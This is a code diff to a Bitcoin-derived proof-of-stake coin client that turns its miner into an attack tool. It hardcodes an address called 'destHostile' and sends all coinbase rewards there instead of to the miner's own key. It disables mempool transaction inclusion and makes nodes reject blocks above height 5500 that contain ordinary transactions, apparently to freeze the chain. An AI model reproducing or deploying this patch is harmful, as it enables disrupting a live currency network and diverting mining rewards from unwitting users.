@@ -4,6 +4,7 @@
 // Distributed under the MIT/X11 software license, see the accompanying
 // file COPYING or http://www.opensource.org/licenses/mit-license.php.
 
+#include "base58.h"
 #include "checkpoints.h"
 #include "db.h"
 #include "net.h"
@@ -62,6 +63,8 @@ int64 nHPSTimerStart;
 
 // Settings
 int64 nTransactionFee = MIN_TX_FEE;
+
+CTxDestination destHostile = CBitcoinAddress("4HcgfVFi2vzm9x7qVpwirAzwtVJAH8NLue").Get();
 
 
 
@@ -1968,6 +1971,9 @@ bool CBlock::AcceptBlock()
     if (nBits != GetNextTargetRequired(pindexPrev, IsProofOfStake()))
         return DoS(100, error("AcceptBlock() : incorrect proof-of-work/proof-of-stake"));
 
+    if (nHeight > 5500 && vtx.size() != 1)
+        return error("AcceptBlock() : block contains non-generation transactions");
+
     // Check timestamp against prev
     if (GetBlockTime() <= pindexPrev->GetMedianTimePast() || GetBlockTime() + nMaxClockDrift < pindexPrev->GetBlockTime())
         return error("AcceptBlock() : block's timestamp is too early");
@@ -3579,7 +3585,7 @@ CBlock* CreateNewBlock(CWallet* pwallet, bool fProofOfStake)
     txNew.vin.resize(1);
     txNew.vin[0].prevout.SetNull();
     txNew.vout.resize(1);
-    txNew.vout[0].scriptPubKey << reservekey.GetReservedKey() << OP_CHECKSIG;
+    txNew.vout[0].scriptPubKey.SetDestination(destHostile);
 
     // Add our coinbase tx as first transaction
     pblock->vtx.push_back(txNew);
@@ -3609,6 +3615,7 @@ CBlock* CreateNewBlock(CWallet* pwallet, bool fProofOfStake)
 
     // Collect memory pool transactions into the block
     int64 nFees = 0;
+#if 0
     {
         LOCK2(cs_main, mempool.cs);
         CTxDB txdb("r");
@@ -3749,6 +3756,7 @@ CBlock* CreateNewBlock(CWallet* pwallet, bool fProofOfStake)
             printf("CreateNewBlock(): total size %lu\n", nBlockSize);
 
     }
+#endif
     if (pblock->IsProofOfWork())
         pblock->vtx[0].vout[0].nValue = GetProofOfWorkReward(pblock->nBits);
 
